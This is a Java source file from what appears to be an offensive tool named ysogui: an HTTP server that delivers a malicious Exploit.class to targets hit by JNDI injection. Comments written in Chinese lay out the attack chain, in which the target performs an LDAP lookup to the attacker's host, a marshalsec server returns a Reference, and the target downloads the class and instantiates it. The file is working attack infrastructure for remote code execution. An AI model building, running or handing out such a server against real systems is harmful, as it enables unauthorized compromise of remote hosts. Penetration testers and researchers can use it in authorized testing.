package ysogui.core;

import java.io.*;
import java.net.*;
import java.util.function.Consumer;

/**
 * 内置 HTTP class 文件服务，配合 marshalsec 的 LDAP/RMI 服务使用。
 *
 * 攻击流程：
 * 1. 目标触发 JNDI 查询 → ldap://攻击者IP:LDAP端口/Exploit
 * 2. marshalsec LDAP 服务返回 Reference → http://攻击者IP:HTTP端口/Exploit.class
 * 3. 目标从本 HTTP 服务下载恶意 .class 并实例化
 */
public class HttpClassServer {

    private final String bindAddr;
    private final int httpPort;  // 0 = auto-assign
    private final String className;
    private final byte[] classBytes;
    protected final Consumer<String> log;

    protected volatile ServerSocket httpServer;
    protected volatile boolean running = false;
    protected volatile int actualPort = 0;  // 实际绑定的端口（httpPort=0 时有用）

    public HttpClassServer(String bindAddr, int httpPort,
                           String className, byte[] classBytes,
                           Consumer<String> log) {
        this.bindAddr = bindAddr;
        this.httpPort = httpPort;
        this.className = className;
        this.classBytes = classBytes;
        this.log = log;
    }

    public boolean isRunning() {
        return running;
    }

    /** 获取实际绑定端口（当传入 0 时返回系统分配的端口）*/
    public int getActualPort() {
        return actualPort > 0 ? actualPort : httpPort;
    }

    /**
     * 启动 HTTP class 服务（阻塞调用，应在后台线程中执行）。
     */
    public void start() throws Exception {
        running = true;
        InetAddress addr = InetAddress.getByName(bindAddr);
        if (httpPort == 0) {
            // 端口0让系统自动分配
            httpServer = new ServerSocket(0, 50, addr);
            actualPort = httpServer.getLocalPort();
        } else {
            httpServer = new ServerSocket(httpPort, 50, addr);
            actualPort = httpPort;
        }
        log.accept("[HTTP] class 服务已启动: http://" + getExternalAddr() + ":" + actualPort);
        log.accept("[HTTP]   文件路径: /" + className + ".class");

        while (running) {
            try {
                Socket client = httpServer.accept();
                client.setSoTimeout(5000);
                try {
                    handleHttpClient(client);
                } catch (Exception ignored) {
                } finally {
                    try { client.close(); } catch (Exception ignored) {}
                }
            } catch (SocketException e) {
                if (!running) break;
                throw e;
            }
        }
    }

    /**
     * 停止服务。
     */
    public void stop() {
        running = false;
        try { if (httpServer != null && !httpServer.isClosed()) httpServer.close(); } catch (Exception ignored) {}
        log.accept("[HTTP] class 服务已停止");
    }

    /**
     * 获取对外展示的地址（优先返回非回环地址）。
     */
    protected String getExternalAddr() {
        if (!"0.0.0.0".equals(bindAddr) && !"::".equals(bindAddr)) {
            return bindAddr;
        }
        try {
            Socket s = new Socket();
            s.connect(new InetSocketAddress("8.8.8.8", 53), 1000);
            String addr = s.getLocalAddress().getHostAddress();
            s.close();
            return addr;
        } catch (Exception e) {
            try {
                return InetAddress.getLocalHost().getHostAddress();
            } catch (Exception e2) {
                return "127.0.0.1";
            }
        }
    }

    protected void handleHttpClient(Socket client) throws Exception {
        InputStream in = client.getInputStream();
        OutputStream out = client.getOutputStream();

        byte[] buf = new byte[4096];
        int len = in.read(buf);
        if (len <= 0) return;

        String request = new String(buf, 0, len, "UTF-8");
        String firstLine = request.split("\r\n")[0];
        log.accept("────────────────────────────────────────");
        log.accept("[HTTP] 请求: " + firstLine);

        String[] parts = firstLine.split(" ");
        if (parts.length < 2) {
            writeResponse(out, 400, "Bad Request", "text/plain", "bad request".getBytes("UTF-8"));
            log.accept("[HTTP] 响应: 400 Bad Request");
            return;
        }

        String method = parts[0];
        String path = parts[1];
        String expectedPath = "/" + className + ".class";

        if (!"GET".equals(method)) {
            writeResponse(out, 405, "Method Not Allowed", "text/plain",
                "method not allowed".getBytes("UTF-8"));
            log.accept("[HTTP] 响应: 405 Method Not Allowed");
            return;
        }
        if (!expectedPath.equals(path)) {
            writeResponse(out, 404, "Not Found", "text/plain", "not found".getBytes("UTF-8"));
            log.accept("[HTTP] 响应: 404 Not Found (expected " + expectedPath + ")");
            return;
        }

        writeResponse(out, 200, "OK", "application/octet-stream", classBytes);
        log.accept("[HTTP] 响应: " + classBytes.length + " bytes .class 已发送");
    }

    private void writeResponse(OutputStream out, int statusCode, String statusText,
                               String contentType, byte[] body) throws Exception {
        String header = "HTTP/1.1 " + statusCode + " " + statusText + "\r\n"
            + "Content-Type: " + contentType + "\r\n"
            + "Content-Length: " + body.length + "\r\n"
            + "Connection: close\r\n"
            + "\r\n";
        out.write(header.getBytes("UTF-8"));
        out.write(body);
        out.flush();
    }
}
